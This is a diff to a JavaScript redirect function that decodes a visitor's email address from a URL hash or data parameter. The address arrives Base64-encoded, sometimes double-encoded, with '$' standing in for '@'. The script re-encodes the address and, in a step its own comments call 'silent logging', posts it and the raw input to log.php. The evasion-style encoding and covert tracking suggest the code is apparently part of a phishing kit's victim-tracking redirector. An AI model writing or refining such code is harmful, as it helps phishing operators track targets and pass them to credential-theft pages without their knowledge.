@@ -39,41 +39,52 @@ function processRedirect() {
             }
         } catch(e) {}
 
-        // Prefer hash over data parameter
-        var encoded = hash || dataParam;
-        if (!encoded) {
+        // Prefer hash over data parameter (if both exist)
+        var rawInput = hash || dataParam;
+        if (!rawInput) {
             logToConsole("No encoded data found (neither #hash nor ?data=)");
             return;
         }
 
-        logToConsole("Original encoded data:", encoded);
+        logToConsole("Original raw input:", rawInput);
         logToConsole("Source:", hash ? "hash" : "data parameter");
 
-        // 2. Decode (supports double encoding fallback)
-        var decoded = decodeBase64(encoded);
-        logToConsole("Decoded once:", decoded);
+        var email = null;
 
-        // Try double decode if needed
-        if (!validateEmail(decoded)) {
-            try {
-                var doubleDecoded = decodeBase64(decoded);
-                if (validateEmail(doubleDecoded)) {
-                    decoded = doubleDecoded;
-                    logToConsole("Double decoded:", decoded);
-                }
-            } catch(e) {}
+        // 2. Check if the raw input is already a plain email (after $→@ replacement)
+        var possibleEmail = rawInput.replace(/\$/g, '@');
+        if (validateEmail(possibleEmail)) {
+            email = possibleEmail;
+            logToConsole("Input is plain email:", email);
+        } else {
+            // 3. Not a plain email → try Base64 decode (with double‑decode fallback)
+            var decoded = decodeBase64(rawInput);
+            logToConsole("Decoded once:", decoded);
+
+            var candidate = decoded.replace(/\$/g, '@');
+            if (validateEmail(candidate)) {
+                email = candidate;
+                logToConsole("Decoded Base64 → email:", email);
+            } else {
+                // Try double decode
+                try {
+                    var doubleDecoded = decodeBase64(decoded);
+                    var candidate2 = doubleDecoded.replace(/\$/g, '@');
+                    if (validateEmail(candidate2)) {
+                        email = candidate2;
+                        logToConsole("Double decoded → email:", email);
+                    }
+                } catch(e) {}
+            }
         }
 
-        // 3. Replace $ with @
-        var email = decoded.replace(/\$/g, '@');
-
-        // 4. Final validation
-        if (!validateEmail(email)) {
+        // 4. Final validation (if email still null or invalid, stop)
+        if (!email || !validateEmail(email)) {
             logToConsole("Invalid email, stopping:", email);
             return;
         }
 
-        // 5. Re-encode clean email
+        // 5. Re‑encode clean email as Base64
         var newHash = btoa(email);
 
         // 6. Silent logging
@@ -82,7 +93,7 @@ function processRedirect() {
                 "log.php",
                 JSON.stringify({ 
                     email: email,
-                    original_encoded: encoded,
+                    original_raw: rawInput,
                     source: hash ? "hash" : "data",
                     timestamp: new Date().toISOString()
                 })
